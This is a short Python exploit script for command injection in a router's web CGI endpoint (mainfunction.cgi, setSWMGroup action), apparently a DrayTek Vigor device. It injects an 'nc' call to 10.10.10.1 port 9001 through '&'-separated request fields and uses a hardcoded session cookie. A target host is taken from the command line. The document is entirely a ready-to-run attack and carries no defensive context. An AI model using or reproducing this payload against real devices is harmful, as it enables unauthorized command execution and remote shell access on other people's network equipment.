import argparse
import requests
 
cookie_value = "7:6489218C0C9EABA942AC700668F4732F"
cookies = {
    "SESSION_ID_VIGOR": cookie_value
}
def system(host):
    cmd1 = "%26"+"nc"
    cmd2 = "10.10.10.1"
    cmd3 = "9001"+"%26"
    try:
        headers = {
            "HOST":host,
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
            "Content-Type": "text/plain; charset=UTF-8",
            "Accept": "*/*",
            }
        url = "http://"+ host + "/cgi-bin/mainfunction.cgi"
        action = "setSWMGroup"
        data = f"action={action}&table={cmd1}&name={cmd2}&password_status={cmd3}&rtick=1724827664524"
        res = requests.post(url=url, data=data,headers=headers,cookies=cookies,verify=False)
        if res.status_code == 200 and res.text != "":
            print("[+] Command executed successfully")
            print("[+] Result: \n" + res.text)
            return res.text
        else:
            print('[-] Command execute failed! Nothing...')
            return 1
    except Exception as e:
        print('[-] Command execute failed!')
        print(e)
 
 
if __name__ == "__main__":
    # 获取第一个参数作为目标地址，第二个命令行参数作为命令
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="target host")
    # parser.add_argument("cmd", help="command to execute")
    args = parser.parse_args()
    system(args.host)

